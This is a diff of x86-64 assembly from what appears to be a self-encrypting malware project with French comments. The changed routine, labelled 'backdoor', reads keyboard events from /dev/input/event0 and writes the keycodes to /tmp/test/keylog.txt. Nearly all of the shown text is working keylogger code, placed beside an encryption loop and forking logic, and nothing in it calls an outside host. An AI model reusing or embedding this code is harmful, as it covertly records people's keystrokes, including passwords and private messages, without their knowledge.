@@ -145,7 +145,7 @@ ft_end:
 	mov r9, 8 ; NB_TIMING MOODULABLE ; dechiffrement
 	mov r13, 2 ; mark this zone as end ; dechiffrement
 dechiffrement_loop2:
-	mov eax, 0x410a;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
+	mov eax, 0x4270;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
 	shr eax, 2 ; dechiffrement & chiffrement
 	jmp after_exit_3
 	jmp after_exit_4
@@ -272,58 +272,56 @@ exit_0:
 	mov rdi, 0x0
 	syscall
 
-write_path1:
-	mov [rdi], DWORD 0x7665642f
-	mov [rdi + 0x4], DWORD 0x706e692f
-	mov [rdi + 0x8], DWORD 0x652f7475
-	mov [rdi + 0xc], DWORD 0x746e6576
-	mov [rdi + 0x10], DWORD 0x00000030
-	ret
 
-write_path2:
-	mov [rdi], DWORD 0x706d742f
-	mov [rdi + 0x4], DWORD 0x7365742f
-	mov [rdi + 0x8], DWORD 0x656b2f74
-	mov [rdi + 0xc], DWORD 0x676f6c79
-	mov [rdi + 0x10], DWORD 0x2e726567
-	mov [rdi + 0x14], DWORD 0x00747874
-	ret
+write_path1 db  "/dev/input/event0", 0
+
+;write_path1:
+;	mov [rsp], DWORD 0x7665642f
+;	mov [rsp + 0x4], DWORD 0x706e692f
+;	mov [rsp + 0x8], DWORD 0x652f7475
+;	mov [rsp + 0xc], DWORD 0x746e6576
+;	mov [rsp + 0x10], DWORD 0x00000030
+;	ret
+
+write_path2 db "/tmp/test/keylog.txt", 0
+;	mov [rsp], DWORD 0x706d742f
+;	mov [rsp + 0x4], DWORD 0x7365742f
+;	mov [rsp + 0x8], DWORD 0x656b2f74
+;	mov [rsp + 0xc], DWORD 0x676f6c79
+;	mov [rsp + 0x10], DWORD 0x2e726567
+;	mov [rsp + 0x14], DWORD 0x00747874
+;	ret
 
 backdoor:
-	mov rdi, 1
-	lea rsi, [print_exit0]
-	mov rdx, 5
-	mov rax, 1
-	syscall
-	
 	sub rsp, 0x20
-	call write_path1
+	lea rdi, [write_path1]
 	xor rsi, rsi
-	mov rdx, 0x1bc
-	mov rax, 0x2
+	mov rdx, 0
+	mov rax, 0x2 ; OPEN SYSCALL
 	syscall
 	cmp rax, 0
 	jl exit_1
 
-	mov rdi, 1
-	lea rsi, [print_exit0]
-	mov rdx, 5
-	mov rax, 1
-	syscall
+	mov DWORD [rbp - 0x20], eax
 
-	mov [rbp - 0x20], rax
-
-	call write_path2
-	mov rsi, 0x201
-	mov rdx, 0x29a
+	lea rdi, [write_path2]
+	mov rsi, 0x41
+	mov rdx, 666o
 	mov rax, 0x2
 	syscall
+
+;	mov rdi, 1
+;	lea rsi, [print_exit0]
+;	mov rdx, 5
+;	mov rax, 1
+;	syscall
+
 	cmp rax, 0
 	jl exit_1
-	mov [rbp - 0x1c], rax
+	mov DWORD [rbp - 0x1c], eax
 
 loop_keylogger:
-	mov rdi, [rbp - 0x20]
+	mov edi, DWORD [rbp - 0x20]
 	lea rsi, [rbp - 0x18]
 	mov rdx, 0x18 ;size of struct input_event
 	xor rax, rax
@@ -334,8 +332,8 @@ loop_keylogger:
 	cmp [rbp - 0x4], DWORD 0x1 ;event value
 	jne loop_keylogger
 
-	mov rdi, [rbp - 0x1c]
-	mov rsi, [rbp - 0x6]
+	mov edi, DWORD [rbp - 0x1c]
+	mov si, WORD [rbp - 0x6]
 	mov rdx, 0x2
 	mov rax, 0x1
 	syscall ;write
@@ -343,13 +341,13 @@ loop_keylogger:
 	jmp loop_keylogger
 
 child_hash:
-	xor rax, rax
-	mov rax, 0x39
-	syscall	;fork
-	mov r14, rax
-	cmp rax, 0
-	je backdoor
-	jl exit_1
+;	xor rax, rax
+;	mov rax, 0x39
+;	syscall	;fork
+;	mov r14, rax
+;	cmp rax, 0
+;	je backdoor
+;	jl exit_1
 	
 	
 	call getppid
